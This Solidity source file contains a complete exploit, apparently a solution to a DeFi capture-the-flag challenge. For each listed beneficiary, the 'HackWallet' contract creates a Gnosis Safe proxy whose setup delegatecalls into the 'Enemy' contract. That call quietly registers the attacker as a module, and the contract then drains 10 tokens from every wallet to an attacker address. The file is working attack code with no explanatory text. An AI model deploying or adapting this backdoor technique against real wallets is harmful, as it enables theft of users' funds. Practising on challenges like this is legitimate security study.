// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

contract Enemy is GnosisSafe {
    function hack(address _module) external {
        modules[_module] = modules[SENTINEL_MODULES];
        modules[SENTINEL_MODULES] = _module;
    }
}

contract HackWallet {
    function attack(
        address _gnosisSafeProxyFactory,
        address _walletRegistry,
        address _gnosisSafe,
        address[] calldata _beneficiaries,
        address _token,
        address _attacker
    ) external {
        for (uint256 i; i < _beneficiaries.length; i++) {
            address[] memory arr = new address[](1);
            arr[0] = _beneficiaries[i];
            Enemy enemy = new Enemy();
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
                _gnosisSafeProxyFactory
            ).createProxyWithCallback(
                    _gnosisSafe,
                    abi.encodeWithSignature(
                        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                        arr,
                        1,
                        address(enemy),
                        abi.encodeWithSignature("hack(address)", address(this)),
                        address(0),
                        address(0),
                        0,
                        address(0)
                    ),
                    block.timestamp + i,
                    IProxyCreationCallback(_walletRegistry)
                );
            ModuleManager(address(proxy)).execTransactionFromModule(
                _token,
                0,
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    _attacker,
                    10 ether
                ),
                Enum.Operation.Call
            );
        }
    }
}
